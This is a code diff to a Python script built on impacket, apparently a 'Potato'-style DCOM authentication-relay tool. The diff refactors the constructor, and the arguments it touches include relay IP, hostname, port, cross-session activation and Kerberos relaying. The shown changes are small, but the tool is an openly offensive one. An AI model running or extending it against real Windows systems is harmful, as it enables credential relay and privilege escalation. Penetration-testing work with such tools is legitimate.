@@ -17,11 +17,7 @@ import random
 import sys
 import argparse
 import logging
-import socketserver
-import socket
-import threading
-
-from impacket import version, uuid
+from impacket import version, uuid, ntlm
 from impacket.examples import logger, utils
 from impacket.dcerpc.v5 import dcomrt, dtypes, rpcrt
 from impacket import LOG
@@ -70,12 +66,12 @@ class DUALSTRINGARRAY(dcomrt.DUALSTRINGARRAYPACKED):
         return dcomrt.DUALSTRINGARRAYPACKED.getData(self, soFar)
 
 class Potato:
-    def __init__(self, domain, username, password, target, target_ip, options):
+    def __init__(self, domain, username, password, target, options):
         self.__domain = domain
         self.__username = username
         self.__password = password
         self.__target = target
-        self.__target_ip = target_ip
+        self.__target_ip = options.target_ip
         self.__options = options
         self.__lmhash = ''
         self.__nthash = ''
@@ -318,7 +314,7 @@ class Potato:
     def run(self):
         self.__dcom = dcomrt.DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                         self.__aesKey, authLevel=rpcrt.RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
-        
+
         try:
             self.RemoteCreateInstance()
 
@@ -345,6 +341,7 @@ if __name__ == '__main__':
     group.add_argument('-clsid', action='store', metavar="CLSID", help='A DCOM CLSID', required=True)
     group.add_argument('-relay-ip', action='store', metavar="IP", help='The IP of the relayer (yourself?)')
     group.add_argument('-relay-hostname', action='store', metavar="HOSTNAME", help='The hostname of the relayer (yourself?)')
+    group.add_argument('-relay-port', action='store', metavar="HOSTNAME", help='The RPC port of the relayer')
     group.add_argument('-session-id', action='store', help='Session ID to perform cross-session activation (default to nothing = SYSTEM activation)')
     group.add_argument('-kerberos', action='store_true', help='Perform relay to kerberos')
     group.add_argument('-spn', action='store', metavar="PROTOCOL\\SERVER", help='SPN to use for the kerberos relaying')
@@ -406,7 +403,7 @@ if __name__ == '__main__':
         logging.error("You need to specify either relay_ip or relay_hostname")
         sys.exit(1)
 
-    potato = Potato(domain, username, password, address, options.target_ip, options)
+    potato = Potato(domain, username, password, address, options)
     try:
         potato.run()
     except Exception as e:
